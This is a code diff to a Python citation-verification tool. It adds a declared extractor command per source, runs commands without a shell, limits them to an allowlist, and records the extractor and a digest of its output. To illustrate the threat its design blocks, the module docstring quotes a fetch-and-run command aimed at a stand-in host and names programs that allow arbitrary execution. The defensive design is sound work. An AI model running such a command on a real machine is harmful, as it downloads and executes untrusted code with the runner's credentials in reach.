@@ -25,16 +25,50 @@ The warnings -- is the quote well formed? A quote can be `found` and still carry
     normalized   matched only after ignoring punctuation and spacing
     page         found, but not on the page the record claims
 
+The extractor -- what turned the source into text? Recorded on every result, with a digest of
+what it produced. A pin says the bytes did not change and says nothing about how they were
+read: two extractors over one PDF produce two texts and one pin, so a decision that does not
+name the program behind it cannot be compared with a later one. A source declaring
+`extract_cmd` is read by the command it names, a `TEXT_SUFFIXES` source straight off disk, and
+everything else by `pdftotext -layout`.
+
 `unchecked` means read the source. A mirror-reversed scan or a broken extraction produces the
 same signal as a passage that was never there -- so an extraction that failed for an
 infrastructure reason says which one, rather than reporting the document as unreadable.
+
+Running a declared `extract_cmd`
+--------------------------------
+
+The command a claims file declares runs on the machine doing the checking. The case that
+decides the rules is not an author running their own file: it is `citations verify` in
+continuous integration on a pull request from a fork, where the contributor wrote the claims
+file and the command executes on the maintainer's runner with the runner's environment and
+credentials in reach. Two measures bound that, and neither is a sanitizer:
+
+    no shell     the declared string is split into a program and arguments and executed
+                 directly. `pdftotext x; curl evil.sh | sh` is not filtered out, it cannot be
+                 expressed -- the `;` and the `|` reach pdftotext as literal arguments.
+    an allowlist only `DEFAULT_EXTRACTORS` runs unasked. Anything else needs
+                 `--allow-extractor NAME`, written by whoever runs the check rather than by
+                 whoever wrote the claims file.
+
+A refused command is `unchecked` and says it was refused; a command that is not installed is
+`unchecked` and says that instead. The remedy for one is consent and for the other an install,
+and neither makes the passage absent.
+
+The allowlist bounds which program runs and not what an allowed program can be told to do, so
+a program that loads and runs code named on its own command line stays out of the default set.
+`pandoc --lua-filter` and `mutool run` are both arbitrary execution, and reaching either is a
+deliberate act with the consequence in view.
 """
 
 from __future__ import annotations
 
 import functools
+import hashlib
 import pathlib
 import re
+import shlex
 import subprocess
 import unicodedata
 from dataclasses import dataclass, field
@@ -56,6 +90,23 @@ PAGE_SCAN_LIMIT = 200
 #: returns nothing, which would read as an unreadable source.
 TEXT_SUFFIXES = (".txt", ".md", ".tei", ".xml", ".html", ".htm", ".rst")
 
+#: Recorded as the extractor for a source read straight off disk. Naming a program there would
+#: claim one ran.
+PLAIN_TEXT = "text"
+
+#: What reads a source that declares no `extract_cmd` and is not plain text.
+DEFAULT_EXTRACTOR = "pdftotext -layout"
+
+#: How long any extractor gets before the source is reported unreadable rather than waited on.
+EXTRACT_TIMEOUT = 120
+
+#: Programs an `extract_cmd` may name with no further consent. Each reads a file and prints
+#: text, and neither can be told on its own command line to load and run code. Matched against
+#: the program as written, so `pdftotext` is allowed and `./pdftotext` is not: a bare name
+#: resolves through PATH, which the machine running the check controls and a claims file
+#: arriving from elsewhere does not.
+DEFAULT_EXTRACTORS = frozenset({"pdftotext", "detex"})
+
 State = Literal["found", "not found", "unchecked"]
 PinState = Literal["ok", "broken", "unpinned", "missing"]
 
@@ -68,6 +119,16 @@ class Result:
     detail: str = ""  # why, when unchecked or not found
     warnings: list[str] = field(default_factory=list)
     page_found: int | None = None
+
+    extractor: str = ""
+    """What turned the source into text: the declared `extract_cmd`, `pdftotext -layout`, or
+    `text` for a source read straight off disk. Empty where nothing was read, so a decision
+    resting on an extractor stays distinguishable from one that rests on none."""
+
+    extraction_digest: str = ""
+    """sha256 of the text the extractor produced. The artifact's pin establishes that the
+    bytes did not change; this establishes that the reading of them did not, which a pin
+    cannot -- two extractors over one PDF produce two texts under one pin."""
 
 
 @dataclass
@@ -99,6 +160,9 @@ class Report:
     """Sources with no recorded digest. Their quotations resolve against whatever is on disk."""
     skipped: list[tuple[str, str]] = field(default_factory=list)
     """Claims files that would not parse, so their quotations were never examined."""
+    extractors: dict[str, int] = field(default_factory=dict)
+    """How many quotations each extractor answered. A report that does not say what read its
+    sources cannot be compared with one taken where a different renderer was declared."""
 
     @property
     def unresolved(self) -> int:
@@ -166,15 +230,84 @@ def skeleton(s: str) -> str:
     return re.sub(r"\s+", "", fold(s))
 
 
+def _argv(source: pathlib.Path, declared: str, allowed: frozenset[str]) -> list[str]:
+    """A declared `extract_cmd` as argv, with the source path substituted in.
+
+    `{}` is replaced by the path wherever it appears, and a command carrying no `{}` gets the
+    path appended, so `detex` and `pdftotext -layout {} -` both name a working extractor.
+
+    Refuses a command that will not parse into a program and arguments, and one naming a
+    program this run was not told to allow. Both raise `SourceUnreadableError`, so both reach
+    the report as `unchecked` with the reason: nothing was read, and the passage is not
+    thereby absent. The module docstring says why the check is an allowlist over argv rather
+    than a filter over a string.
+    """
+    try:
+        parts = shlex.split(declared)
+    except ValueError as e:
+        raise SourceUnreadableError(source, f"extract_cmd will not parse as a command: {e}") from e
+    if not parts:
+        raise SourceUnreadableError(source, "extract_cmd is empty")
+    if parts[0] not in allowed:
+        raise SourceUnreadableError(
+            source,
+            f"extract_cmd names {parts[0]!r}, which this run does not allow -- "
+            f"pass --allow-extractor {parts[0]} to run it",
+        )
+    if any("{}" in part for part in parts):
+        return [part.replace("{}", str(source)) for part in parts]
+    return [*parts, str(source)]
+
+
+def _run(source: pathlib.Path, argv: list[str], missing: str = "", hint: str = "") -> str:
+    """Run one extractor over `source` and return what it printed.
+
+    Never through a shell: `subprocess.run` is handed a list, so a metacharacter in a declared
+    command is an argument to the program rather than an operator interpreted before it.
+
+    Every way the toolchain can fail raises `SourceUnreadableError` naming which way, rather
+    than returning empty text. An empty return means the document holds no extractable text,
+    which is a fact about the document and carries a different message.
+    """
+    program = argv[0]
+    try:
+        proc = subprocess.run(argv, capture_output=True, text=True, timeout=EXTRACT_TIMEOUT)
+    except FileNotFoundError as e:
+        raise SourceUnreadableError(source, (missing or f"{program} is not on PATH") + hint) from e
+    except subprocess.TimeoutExpired as e:
+        raise SourceUnreadableError(source, f"{program} timed out after {EXTRACT_TIMEOUT}s") from e
+    except OSError as e:
+        raise SourceUnreadableError(source, f"{program} could not be run: {e}") from e
+    if proc.returncode != 0:
+        said = (proc.stderr or "").strip().splitlines()
+        raise SourceUnreadableError(
+            source,
+            f"{program} exited {proc.returncode}" + (f": {said[-1]}" if said else "") + hint,
+        )
+    return proc.stdout
+
+
 @functools.lru_cache(maxsize=64)
-def extract(pdf: pathlib.Path, page: int | None = None) -> str:
+def extract(
+    pdf: pathlib.Path,
+    page: int | None = None,
+    extract_cmd: str | None = None,
+    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
+) -> str:
     """Text of a source. Cached, so N quotes against one file is one extraction.
 
-    Raises `SourceUnreadableError` when the extraction toolchain is at fault -- a missing
-    `pdftotext`, a timeout, a permission error -- rather than returning empty text. An empty
-    return means the document genuinely holds no extractable text on that page, which is a
-    different fact and gets a different message.
+    A declared `extract_cmd` takes precedence over both other paths, including reading a
+    `TEXT_SUFFIXES` file directly: an author names a renderer because the bytes on disk are
+    not the text they quote. It renders the whole document at once, so `page` does not reach
+    it, and `allowed` decides which programs this run will run.
+
+    Raises `SourceUnreadableError` when the extraction toolchain is at fault -- a missing or
+    refused command, a timeout, a permission error -- rather than returning empty text. An
+    empty return means the document genuinely holds no extractable text on that page, which is
+    a different fact and gets a different message.
     """
+    if extract_cmd:
+        return _run(pdf, _argv(pdf, extract_cmd, allowed))
     if pdf.suffix.lower() in TEXT_SUFFIXES:
         try:
             return pdf.read_text(errors="replace")
@@ -185,20 +318,27 @@ def extract(pdf: pathlib.Path, page: int | None = None) -> str:
     if page:
         cmd += ["-f", str(page), "-l", str(page)]
     cmd += [str(pdf), "-"]
-    try:
-        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
-    except FileNotFoundError as e:
-        raise SourceUnreadableError(pdf, "pdftotext is not on PATH -- install poppler-utils") from e
-    except subprocess.TimeoutExpired as e:
-        raise SourceUnreadableError(pdf, "pdftotext timed out after 120s") from e
-    except OSError as e:
-        raise SourceUnreadableError(pdf, f"pdftotext could not be run: {e}") from e
-    if proc.returncode != 0:
-        detail = (proc.stderr or "").strip().splitlines()
-        raise SourceUnreadableError(
-            pdf, f"pdftotext exited {proc.returncode}" + (f": {detail[-1]}" if detail else "")
-        )
-    return proc.stdout
+    # A `.tex` handed to a PDF reader answers `Syntax Error: Couldn't read xref table`, which
+    # reads as a damaged document rather than as the wrong tool pointed at an intact one.
+    hint = (
+        ""
+        if pdf.suffix.lower() in ("", ".pdf")
+        else f"  ({pdf.suffix} is not a PDF: declare extract_cmd to name the renderer)"
+    )
+    return _run(pdf, cmd, "pdftotext is not on PATH -- install poppler-utils", hint)
+
+
+@functools.lru_cache(maxsize=64)
+def _digest(text: str) -> str:
+    """sha256 of what an extractor produced, recorded beside the extractor that produced it."""
+    return hashlib.sha256(text.encode()).hexdigest()
+
+
+def _extractor_name(artifact: pathlib.Path, extract_cmd: str | None) -> str:
+    """What `extract` reads this source with, as the report names it."""
+    if extract_cmd:
+        return " ".join(extract_cmd.split())
+    return PLAIN_TEXT if artifact.suffix.lower() in TEXT_SUFFIXES else DEFAULT_EXTRACTOR
 
 
 @functools.lru_cache(maxsize=256)
@@ -225,7 +365,20 @@ def check_pin(artifact: pathlib.Path | None, expected: str | None) -> Pin:
     return Pin("ok" if actual == expected else "broken", expected, actual)
 
 
-def check_one(quote: str, artifact: pathlib.Path | None, page: int | None = None) -> Result:
+def check_one(
+    quote: str,
+    artifact: pathlib.Path | None,
+    page: int | None = None,
+    extract_cmd: str | None = None,
+    allowed: frozenset[str] = DEFAULT_EXTRACTORS,
+) -> Result:
+    """Does this passage appear in this source, and what read the source to decide?
+
+    `extract_cmd` is the command the claims file declares; `allowed` is the set of programs
+    this run will run, which the caller decides rather than the file. A command that is
+    refused, missing, failing or silent yields `unchecked` carrying the reason -- none of
+    those makes the passage absent.
+    """
     warn: list[str] = []
     text = quote.strip()
     if len(text) < MIN_QUOTE_CHARS or text.endswith(
@@ -236,13 +389,30 @@ def check_one(quote: str, artifact: pathlib.Path | None, page: int | None = None
     if artifact is None or not artifact.exists():
         return Result("unchecked", "file not found", warn)
 
+    # Called with the arguments it has always taken where nothing is declared. `extract` is
+    # exported, and a caller that wraps or substitutes it wrote against the two-argument shape;
+    # a source with no `extract_cmd` must not start reaching them for a new one.
     try:
-        full = extract(artifact)
+        full = extract(artifact, None, extract_cmd, allowed) if extract_cmd else extract(artifact)
     except SourceUnreadableError as e:
         return Result("unchecked", e.detail, warn)
     if not full.strip():
         return Result("unchecked", "no text extracted", warn)
 
+    # A declared extractor renders the whole document at once, so there is no page to ask it
+    # about: the position a `.txt` source is already in. Asking `pdftotext` for the page
+    # instead would run a PDF reader over a source whose author said it is not one.
+    paginated = extract_cmd is None and is_paginated(artifact)
+    result = _verdict(quote, full, artifact, page if paginated else None, warn)
+    result.extractor = _extractor_name(artifact, extract_cmd)
+    result.extraction_digest = _digest(full)
+    return result
+
+
+def _verdict(
+    quote: str, full: str, artifact: pathlib.Path, page: int | None, warn: list[str]
+) -> Result:
+    """The verdict on one passage, against the text an extractor produced."""
     q, doc = fold(quote), fold(full)
     if not q:
         # `"" in doc` is True. A quotation that folds away entirely is not a quotation.
